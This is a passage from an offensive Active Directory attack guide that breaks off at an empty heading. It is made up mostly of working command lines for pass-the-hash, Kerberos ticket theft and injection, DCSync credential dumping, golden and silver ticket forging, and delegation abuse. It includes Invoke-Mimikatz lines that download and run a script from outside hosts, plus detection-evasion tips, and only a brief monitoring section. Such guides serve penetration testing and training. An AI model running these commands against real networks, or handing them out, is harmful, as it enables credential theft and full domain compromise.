Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Components:
- Username: Administrator
- RID: 500 (Relative Identifier)
- LM Hash: aad3b435b51404eeaad3b435b51404ee (empty/disabled)
- NTLM Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

#### Impacket Pass-the-Hash

Impacket is a Python library providing tools for network protocol interaction, particularly useful for Windows/AD exploitation.

**Installation:**

```bash
# Install via pip
pip3 install impacket

# Install from GitHub (latest version)
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

# Verify installation
impacket-smbexec -h
```

**psexec.py - Execute Commands via SMB:**

```bash
# Basic syntax
impacket-psexec domain/username@target -hashes LM:NTLM

# Using NTLM hash only (LM empty)
impacket-psexec administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using domain context
impacket-psexec CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# With password (for comparison)
impacket-psexec administrator@192.168.1.100 -p Password123!

# Spawn interactive shell
impacket-psexec 'CORP/admin:@192.168.1.100' -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

**wmiexec.py - Execute via WMI (Stealthier):**

```bash
# Basic WMI execution
impacket-wmiexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Domain context
impacket-wmiexec CORP/administrator@DC01 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Execute specific command
impacket-wmiexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "whoami"

# No output mode (execute and exit)
impacket-wmiexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -nooutput
```

**smbexec.py - SMB-based Execution:**

```bash
# SMB execution method
impacket-smbexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# With domain
impacket-smbexec CORP/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Using share for command execution
impacket-smbexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -share ADMIN$
```

**atexec.py - Task Scheduler Execution:**

```bash
# Execute via scheduled task
impacket-atexec administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "whoami"

# Domain user
impacket-atexec CORP/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "powershell -c Get-Process"
```

**secretsdump.py - Extract Credentials:**

```bash
# Dump SAM database
impacket-secretsdump administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Dump NTDS.dit from Domain Controller
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc

# Dump NTDS with history
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-ntlm

# Extract specific user
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user krbtgt

# Output to file
impacket-secretsdump administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -outputfile hashes.txt
```

#### Mimikatz Pass-the-Hash

Mimikatz is a post-exploitation tool for credential extraction and manipulation on Windows systems.

**Basic Mimikatz Commands:**

```cmd
REM Run Mimikatz
mimikatz.exe

REM Enable debug privileges
privilege::debug

REM Dump credentials from memory
sekurlsa::logonpasswords

REM Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

**PowerShell Mimikatz (Invoke-Mimikatz):**

```powershell
# Load from memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Dump credentials
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Pass-the-Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe"'
```

**Pass-the-Hash with Mimikatz (Detailed):**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

REM This spawns a new command prompt with Administrator's context
REM From the new cmd.exe, access remote resources:
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe
```

#### CrackMapExec (CME) Pass-the-Hash

```bash
# Install CrackMapExec
pipx install crackmapexec

# Basic Pass-the-Hash
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Check multiple hosts
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Execute command
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "whoami"

# Execute PowerShell
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -X '$PSVersionTable'

# Dump SAM
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --lsa

# Spider shares
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --spider C$ --pattern password
```

#### Evil-WinRM Pass-the-Hash

```bash
# Install Evil-WinRM
gem install evil-winrm

# Connect with hash
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# With domain
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP.LOCAL

# Upload file after connection
*Evil-WinRM* PS C:\> upload /path/to/local/file C:\Windows\Temp\file

# Download file
*Evil-WinRM* PS C:\> download C:\Windows\Temp\file /path/to/local/
```

### Pass-the-Ticket (PtT)

Pass-the-Ticket exploits Kerberos authentication by injecting stolen Kerberos tickets (TGT or TGS) into the current session, granting access to resources without needing the password or hash.

#### Understanding Kerberos Tickets

```
TGT (Ticket Granting Ticket):
- Issued by KDC (Key Distribution Center)
- Used to request service tickets
- Valid for 10 hours by default
- Stored in memory

TGS (Ticket Granting Service):
- Service-specific ticket
- Issued by KDC using TGT
- Grants access to specific service
- Lifetime varies by service
```

#### Extracting Tickets with Mimikatz

```cmd
REM Enable debug privilege
mimikatz # privilege::debug

REM List all tickets in memory
mimikatz # sekurlsa::tickets

REM Export all tickets
mimikatz # sekurlsa::tickets /export

REM This creates .kirbi files in current directory
REM Format: [0;12bd0]-0-0-40810000-username@service-domain.local.kirbi
```

**Export Specific Ticket:**

```cmd
REM List tickets for specific user
mimikatz # sekurlsa::tickets /user:administrator

REM View Kerberos tickets (alternative method)
mimikatz # kerberos::list

REM Export Kerberos tickets
mimikatz # kerberos::list /export
```

#### Injecting Tickets with Mimikatz

```cmd
REM Inject ticket into current session
mimikatz # kerberos::ptt [0;12bd0]-2-0-40e10000-administrator@krbtgt-CORP.LOCAL.kirbi

REM Verify ticket injection
mimikatz # kerberos::list

REM Exit Mimikatz and test access
C:\> dir \\DC01\C$
C:\> psexec.exe \\DC01 cmd.exe
```

**Multiple Ticket Injection:**

```cmd
REM Inject all tickets from directory
mimikatz # kerberos::ptt *.kirbi

REM Purge existing tickets first
mimikatz # kerberos::purge

REM Then inject
mimikatz # kerberos::ptt ticket.kirbi
```

#### Rubeus Pass-the-Ticket

Rubeus is a C# toolset for Kerberos interaction and abuse.

**Dumping Tickets:**

```powershell
# Dump all tickets
.\Rubeus.exe dump

# Dump current user's tickets
.\Rubeus.exe dump /nowrap

# Dump specific user tickets (requires elevation)
.\Rubeus.exe dump /user:administrator /nowrap

# Dump tickets and save to file
.\Rubeus.exe dump /service:krbtgt /nowrap > tickets.txt
```

**Injecting Tickets:**

```powershell
# Inject ticket (base64 encoded)
.\Rubeus.exe ptt /ticket:doIFLD...

# Inject from .kirbi file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Create sacrifice process and inject
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CORP /username:administrator /password:FakePass /ticket:doIFLD...
```

**Renewing Tickets:**

```powershell
# Renew TGT
.\Rubeus.exe renew /ticket:doIFLD...

# Renew and inject
.\Rubeus.exe renew /ticket:ticket.kirbi /ptt
```

#### Impacket Ticket Manipulation

```bash
# Convert .kirbi (Mimikatz) to .ccache (Impacket)
ticketConverter.py ticket.kirbi ticket.ccache

# Set ticket for Impacket tools
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with psexec
impacket-psexec CORP/administrator@DC01.corp.local -k -no-pass

# Use with secretsdump
impacket-secretsdump -k -no-pass DC01.corp.local

# Use with wmiexec
impacket-wmiexec -k -no-pass CORP/administrator@DC01.corp.local
```

#### Linux Pass-the-Ticket

```bash
# Import ticket on Linux
export KRB5CCNAME=/tmp/ticket.ccache

# Verify ticket
klist

# Use with smbclient
smbclient -k //DC01.corp.local/C$ -c ls

# Use with rpcclient
rpcclient -k DC01.corp.local
```

### Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash converts an NTLM hash into a Kerberos ticket (TGT), enabling Kerberos authentication with only hash knowledge. This is useful when NTLM is disabled but Kerberos is available.

#### Concept Overview

```
Traditional Flow:
Password → NTLM Hash → NTLM Auth

Overpass-the-Hash:
NTLM Hash → Request TGT → Kerberos Auth

Advantage: Bypasses NTLM restrictions while maintaining access
```

#### Mimikatz Overpass-the-Hash

```cmd
REM Basic overpass-the-hash
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe

REM This spawns PowerShell with ticket-requesting capability
REM From the new PowerShell session:
PS> klist
PS> dir \\DC01\C$
```

**Detailed Process:**

```cmd
mimikatz # privilege::debug

mimikatz # sekurlsa::pth /user:administrator /domain:CORP.LOCAL /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:"powershell -NoExit"

REM In the spawned PowerShell:
REM Access a resource to generate TGT
PS> ls \\DC01.corp.local\C$

REM View the generated Kerberos ticket
mimikatz # sekurlsa::tickets
```

**Using RC4 Key (Alternative):**

```cmd
REM Overpass with AES256 key (if available)
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /aes256:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe

REM RC4 key (NTLM hash) is most common
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

#### Rubeus Overpass-the-Hash

```powershell
# Request TGT using NTLM hash
.\Rubeus.exe asktgt /user:administrator /domain:CORP.LOCAL /rc4:31d6cfe0d16ae931b73c59d7e0c089c0

# Request and inject TGT
.\Rubeus.exe asktgt /user:administrator /domain:CORP.LOCAL /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt

# Using AES256 key
.\Rubeus.exe asktgt /user:administrator /domain:CORP.LOCAL /aes256:32ed87bdb5fdc5e9cba88547376818d4 /ptt

# Request TGT for specific service
.\Rubeus.exe asktgt /user:administrator /domain:CORP.LOCAL /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /opsec /ptt

# Create netonly process and inject
.\Rubeus.exe asktgt /user:administrator /domain:CORP.LOCAL /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /createnetonly:C:\Windows\System32\cmd.exe /ptt
```

#### Impacket getTGT

```bash
# Request TGT with hash
impacket-getTGT CORP.LOCAL/administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# This creates administrator.ccache file

# Set environment variable
export KRB5CCNAME=administrator.ccache

# Use with Impacket tools
impacket-psexec -k -no-pass CORP.LOCAL/administrator@DC01.corp.local

# Using AES key
impacket-getTGT CORP.LOCAL/administrator -aesKey 32ed87bdb5fdc5e9cba88547376818d4
```

#### Differences: Pass-the-Hash vs Overpass-the-Hash

```
Pass-the-Hash:
- Uses NTLM authentication protocol
- Hash used directly for authentication
- Detectable via NTLM monitoring
- Works without Kerberos

Overpass-the-Hash:
- Converts hash to Kerberos ticket
- Uses Kerberos authentication
- Appears as legitimate Kerberos auth
- Bypasses NTLM monitoring
- Requires access to KDC
```

### DCSync Attacks

DCSync abuses Directory Replication Service (DRS) to impersonate a Domain Controller and request password hashes from another DC. This requires specific Active Directory permissions.

#### Required Permissions

```
DCSync requires one of the following:
1. Domain Admins group membership
2. Enterprise Admins group membership
3. Administrators group on Domain Controller
4. Specific extended rights:
   - Replicating Directory Changes (DS-Replication-Get-Changes)
   - Replicating Directory Changes All (DS-Replication-Get-Changes-All)
   - Replicating Directory Changes In Filtered Set
```

**Check Permissions:**

```powershell
# Check if current user has DCSync rights
Import-Module ActiveDirectory
(Get-Acl "AD:\DC=corp,DC=local").Access | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" -or
    $_.ObjectType -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
}
```

#### Mimikatz DCSync

```cmd
REM DCSync specific user
mimikatz # lsadump::dcsync /user:CORP\Administrator

REM DCSync with domain context
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:Administrator

REM DCSync krbtgt account (golden ticket material)
mimikatz # lsadump::dcsync /user:CORP\krbtgt

REM DCSync all domain users
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /all /csv

REM Export to file
mimikatz # log dcsync_output.txt
mimikatz # lsadump::dcsync /domain:CORP.LOCAL /all
mimikatz # exit
```

**DCSync Output Format:**

```
Object RDN           : Administrator
** SAM ACCOUNT **
SAM Username         : Administrator
User Principal Name  : Administrator@CORP.LOCAL
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )

Credentials:
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
    ntlm- 0: 31d6cfe0d16ae931b73c59d7e0c089c0
    lm  - 0: aad3b435b51404eeaad3b435b51404ee

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.LOCALAdministrator
    Credentials:
      aes256_hmac       (4096) : 32ed87bdb5fdc5e9cba88547376818d4...
      aes128_hmac       (4096) : 52a8b8a8e6e4c7e6c5d4c7e6c5d4c7e6...
```

#### Impacket secretsdump DCSync

```bash
# DCSync using credentials
impacket-secretsdump CORP/administrator:Password123@DC01.corp.local

# DCSync using hash
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Extract only NTDS (DCSync)
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc

# Extract specific user
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user krbtgt

# Extract with NTLM history
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -history

# Output to file
impacket-secretsdump CORP/administrator@DC01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc -outputfile dcsync_hashes

# Using Kerberos ticket
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc
```

#### CrackMapExec DCSync

```bash
# DCSync with credentials
crackmapexec smb DC01.corp.local -u administrator -p Password123 --ntds

# DCSync with hash
crackmapexec smb DC01.corp.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --ntds

# Extract and save to file
crackmapexec smb DC01.corp.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --ntds --users

# DCSync specific user
crackmapexec smb DC01.corp.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --ntds --user krbtgt

# Save hashes in Hashcat format
crackmapexec smb DC01.corp.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --ntds --ntds-pwdLastSet --ntds-history
```

#### Invoke-Mimikatz DCSync (PowerShell)

```powershell
# Load Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')

# DCSync Administrator
Invoke-Mimikatz -Command '"lsadump::dcsync /user:CORP\Administrator"'

# DCSync krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:CORP\krbtgt"'

# DCSync all users
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CORP.LOCAL /all"'

# Save to file
Invoke-Mimikatz -Command '"log dcsync.txt" "lsadump::dcsync /domain:CORP.LOCAL /all"'
```

#### Post-DCSync Actions

**Extract krbtgt for Golden Ticket:**

```cmd
mimikatz # lsadump::dcsync /user:krbtgt

REM Note these values:
REM - krbtgt NTLM hash
REM - Domain SID
REM - Domain name

REM Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

**Crack Extracted Hashes:**

```bash
# Save hashes to file (format: username:hash)
cat dcsync_output.txt | grep "Hash NTLM" > ntlm_hashes.txt

# Crack with Hashcat
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with John
john --format=NT ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Detection Evasion

```powershell
# DCSync from compromised DC is harder to detect
# Query local DC instead of remote
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CORP.LOCAL /dc:localhost /user:Administrator"'

# Throttle requests (reduces traffic spikes)
# Extract users individually with delays
```

#### Defensive Considerations

```
Monitoring for DCSync:
- Event ID 4662: Object Access with properties:
  - Object Type: domainDNS
  - Properties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
  - Properties: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
  
- Monitor for non-DC machines initiating replication
- Review accounts with replication permissions
- Implement tiered administration model
```

#### BloodHound DCSync Path Discovery

```powershell
# Find accounts with DCSync privileges
# In BloodHound query:
MATCH p=(n)-[r:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

# Find shortest path to DCSync
MATCH p=shortestPath((n)-[*1..]->(d:Domain)) WHERE n.name="USER@CORP.LOCAL" RETURN p
```

---

### Lateral Movement Within Domain

Lateral movement involves pivoting from a compromised host to other systems within the Active Directory environment while maintaining persistence and evading detection.

**Pass-the-Hash (PtH)**

Pass-the-Hash allows authentication using NTLM hashes without knowing plaintext passwords.

```bash
# Using pth-winexe
pth-winexe -U DOMAIN/username%hash //target.ip cmd.exe

# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u username -H 'NTHASH' -d DOMAIN

# Using Impacket's psexec
impacket-psexec -hashes :NTHASH DOMAIN/username@target.ip

# Using evil-winrm with hash
evil-winrm -i target.ip -u username -H NTHASH
```

**Pass-the-Ticket (PtT)**

Pass-the-Ticket uses Kerberos TGTs or service tickets for authentication.

```bash
# Export tickets from memory (Mimikatz on target)
sekurlsa::tickets /export

# Import ticket in Linux
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with Impacket
impacket-psexec -k -no-pass DOMAIN/username@target.fqdn

# Using Rubeus on Windows target
Rubeus.exe ptt /ticket:base64ticket
```

**OverPass-the-Hash (Pass-the-Key)**

Convert NTLM hash to Kerberos ticket.

```bash
# Using Impacket's getTGT
impacket-getTGT DOMAIN/username -hashes :NTHASH

# Using Rubeus
Rubeus.exe asktgt /user:username /rc4:NTHASH /domain:domain.local
```

**PSExec and Remote Execution**

```bash
# Impacket psexec
impacket-psexec DOMAIN/username:password@target.ip

# Impacket smbexec (stealthier, no service creation)
impacket-smbexec DOMAIN/username:password@target.ip

# Impacket wmiexec (no SMB writes)
impacket-wmiexec DOMAIN/username:password@target.ip

# Impacket atexec (scheduled tasks)
impacket-atexec DOMAIN/username:password@target.ip 'command'

# CrackMapExec with command execution
crackmapexec smb target.ip -u username -p password -x 'whoami'
```

**WinRM-Based Movement**

```bash
# evil-winrm connection
evil-winrm -i target.ip -u username -p password

# With hash
evil-winrm -i target.ip -u username -H NTHASH

# PowerShell remoting via proxychains
proxychains evil-winrm -i target.ip -u username -p password
```

**RDP with Restricted Admin Mode**

```bash
# Using xfreerdp with hash (requires Restricted Admin enabled)
xfreerdp /u:username /pth:NTHASH /v:target.ip /cert-ignore

# Check if Restricted Admin is enabled
crackmapexec smb target.ip -u username -p password -M rdp-check
```

**DCOM-Based Lateral Movement**

[Inference] DCOM can be exploited for lateral movement through various methods, though specific exploitation requires Windows scripting or tools like Impacket.

```bash
# Using Impacket's dcomexec
impacket-dcomexec DOMAIN/username:password@target.ip 'command'

# Specify DCOM object
impacket-dcomexec DOMAIN/username:password@target.ip -object MMC20 'command'
```

### Golden Ticket Creation

Golden Tickets are forged Kerberos TGTs created using the KRBTGT account hash, granting domain-wide access with arbitrary user privileges.

**Prerequisites**

- KRBTGT account NTLM hash or AES key
- Domain SID
- Domain FQDN

**Obtaining Required Information**

```bash
# Dump KRBTGT hash using secretsdump
impacket-secretsdump DOMAIN/username:password@dc.ip -just-dc-user krbtgt

# Extract domain SID (from any domain user SID, remove last RID)
# Example: S-1-5-21-1234567890-1234567890-1234567890-500
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890

# Get domain SID using rpcclient
rpcclient -U username target.ip -c 'lookupnames username'
```

**Creating Golden Ticket with Impacket**

```bash
# Create golden ticket (ticketer.py)
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain domain.local username

# With AES key (more stealthy)
impacket-ticketer -aesKey KRBTGT_AES256_KEY -domain-sid DOMAIN_SID -domain domain.local username

# Specify user-id (RID), default is 500 (Administrator)
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain domain.local -user-id 1000 username

# Add extra SIDs (Domain Admins = 512, Enterprise Admins = 519)
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain domain.local -extra-sid DOMAIN_SID-512 username

# Specify ticket duration (default 10 years)
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain domain.local -duration 365 username
```

**Using Golden Ticket**

```bash
# Export ticket to environment
export KRB5CCNAME=/path/to/username.ccache

# Verify ticket
klist

# Use with Impacket tools
impacket-psexec -k -no-pass domain.local/username@dc.fqdn

# DCSync with golden ticket
impacket-secretsdump -k -no-pass domain.local/username@dc.fqdn -just-dc
```

**Windows-Based Creation (Mimikatz)**

On a compromised Windows system with Mimikatz:

```
# Create golden ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_NTHASH /id:500 /ptt

# With AES key
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /aes256:KRBTGT_AES256 /id:500 /ptt

# /ptt automatically injects ticket, or save to file
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_NTHASH /ticket:golden.kirbi
```

**Detection Evasion Considerations**

[Inference] The following may reduce detection likelihood, though no technique guarantees evasion:

- Use AES256 keys instead of NTLM hashes (reduces event log anomalies)
- Avoid default RID 500, use legitimate user RIDs
- Set realistic ticket lifetimes (default 10 hours instead of 10 years)
- Match existing user patterns for account names

### Silver Ticket Creation

Silver Tickets are forged Kerberos TGS tickets for specific services, created using the service account's NTLM hash or AES key.

**Key Differences from Golden Tickets**

- Require service account hash (not KRBTGT)
- Grant access only to specific services
- Do not contact the Domain Controller for validation
- Less detectable than Golden Tickets [Inference]

**Target Services and SPNs**

Common service principal names (SPNs):

- `CIFS/hostname.domain.local` - File shares, remote admin
- `HTTP/hostname.domain.local` - Web services
- `MSSQL/hostname.domain.local` - SQL Server
- `HOST/hostname.domain.local` - Multiple services (scheduled tasks, WMI)
- `LDAP/hostname.domain.local` - LDAP queries
- `RPCSS/hostname.domain.local` - WMI, RPC services

**Obtaining Service Account Hash**

```bash
# Dump all hashes including service accounts
impacket-secretsdump DOMAIN/username:password@dc.ip

# Target specific computer account (computer accounts end with $)
impacket-secretsdump DOMAIN/username:password@dc.ip -just-dc-user 'COMPUTERNAME$'

# Kerberoast to obtain service account hashes
impacket-GetUserSPNs DOMAIN/username:password -dc-ip dc.ip -request
```

**Creating Silver Ticket with Impacket**

```bash
# Basic silver ticket for CIFS service
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid DOMAIN_SID -domain domain.local -spn CIFS/target.domain.local username

# With AES key
impacket-ticketer -aesKey SERVICE_ACCOUNT_AES256 -domain-sid DOMAIN_SID -domain domain.local -spn CIFS/target.domain.local username

# Multiple SPNs for single ticket
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid DOMAIN_SID -domain domain.local -spn CIFS/target.domain.local -spn HTTP/target.domain.local username

# Computer account hash for HOST service
impacket-ticketer -nthash COMPUTER_ACCOUNT_HASH -domain-sid DOMAIN_SID -domain domain.local -spn HOST/target.domain.local username
```

**Using Silver Ticket**

```bash
# Export ticket
export KRB5CCNAME=/path/to/username.ccache

# Access file share
smbclient -k //target.domain.local/C$ -W domain.local

# Remote execution with silver ticket for HOST or CIFS
impacket-psexec -k -no-pass domain.local/username@target.domain.local

# WMI execution with RPCSS or HOST ticket
impacket-wmiexec -k -no-pass domain.local/username@target.domain.local
```

**Windows-Based Creation (Mimikatz)**

```
# Create silver ticket for CIFS service
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /target:target.domain.local /service:CIFS /rc4:SERVICE_HASH /ptt

# Using AES key
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /target:target.domain.local /service:CIFS /aes256:SERVICE_AES256 /ptt

# HOST service for broader access
kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /target:target.domain.local /service:HOST /rc4:COMPUTER_HASH /ptt
```

**Computer Account Silver Tickets**

Computer accounts (`COMPUTERNAME$`) are particularly valuable targets:

```bash
# Get computer account hash
impacket-secretsdump DOMAIN/username:password@dc.ip -just-dc-user 'COMPUTERNAME$'

# Create silver ticket for multiple services using computer account
impacket-ticketer -nthash COMPUTER_HASH -domain-sid DOMAIN_SID -domain domain.local -spn HOST/target.domain.local -spn CIFS/target.domain.local Administrator

# RBCD exploitation prerequisite (see delegation abuse)
```

### Delegation Abuse (Constrained/Unconstrained)

Kerberos delegation allows services to impersonate users when accessing resources. Misconfigured delegation presents privilege escalation opportunities.

**Unconstrained Delegation**

Accounts with unconstrained delegation store user TGTs in memory when users authenticate to them.

**Identifying Unconstrained Delegation**

```bash
# Using Impacket's findDelegation
impacket-findDelegation DOMAIN/username:password -dc-ip dc.ip

# Using ldapsearch
ldapsearch -x -H ldap://dc.ip -D "username@domain.local" -w 'password' -b "dc=domain,dc=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn

# Check for TRUSTED_FOR_DELEGATION flag
# Using CrackMapExec
crackmapexec ldap dc.ip -u username -p password --trusted-for-delegation
```

**Exploiting Unconstrained Delegation**

[Inference] The typical attack path involves forcing a privileged account to authenticate to the compromised system with unconstrained delegation:

```bash
# Step 1: Compromise system with unconstrained delegation
# Step 2: Monitor for incoming tickets (Windows with Rubeus)
Rubeus.exe monitor /interval:5

# Step 3: Force DC authentication (PrinterBug/PetitPotam)
# Using printerbug.py
python3 printerbug.py DOMAIN/username:password@dc.ip compromised-server.domain.local

# Step 4: Extract TGT from memory (Mimikatz on compromised system)
sekurlsa::tickets /export

# Step 5: Use extracted TGT
export KRB5CCNAME=/path/to/extracted-tgt.ccache
impacket-secretsdump -k -no-pass domain.local/dc$@dc.domain.local
```

**Constrained Delegation**

Constrained delegation restricts which services an account can impersonate users to.

**Types of Constrained Delegation**

- Traditional constrained delegation (protocol transition disabled)
- Constrained delegation with protocol transition (T2A4D)

**Identifying Constrained Delegation**

```bash
# Using findDelegation.py
impacket-findDelegation DOMAIN/username:password -dc-ip dc.ip

# Look for msDS-AllowedToDelegateTo attribute
ldapsearch -x -H ldap://dc.ip -D "username@domain.local" -w 'password' -b "dc=domain,dc=local" "msDS-AllowedToDelegateTo=*" cn msDS-AllowedToDelegateTo

# Check for protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION)
ldapsearch -x -H ldap://dc.ip -D "username@domain.local" -w 'password' -b "dc=domain,dc=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" cn
```

**Exploiting Constrained Delegation with Protocol Transition**

When an account has `TRUSTED_TO_AUTH_FOR_DELEGATION` set, it can request tickets on behalf of any user:

```bash
# Using Impacket's getST.py
impacket-getST -spn CIFS/target.domain.local -impersonate Administrator -dc-ip dc.ip domain.local/serviceaccount:password

# With hash instead of password
impacket-getST -spn CIFS/target.domain.local -impersonate Administrator -hashes :NTHASH -dc-ip dc.ip domain.local/serviceaccount

# Use the generated ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

**Exploiting Constrained Delegation without Protocol Transition**

Without protocol transition, you need a valid service ticket (S4U2Proxy):

```bash
# Requires existing TGT or service ticket for target user
# Obtain TGT for target user first (via credential theft or other means)

# Request service ticket using delegation
impacket-getST -spn CIFS/target.domain.local -impersonate Administrator -additional-ticket user.ccache -dc-ip dc.ip domain.local/serviceaccount:password
```

**Alternative Service Exploitation**

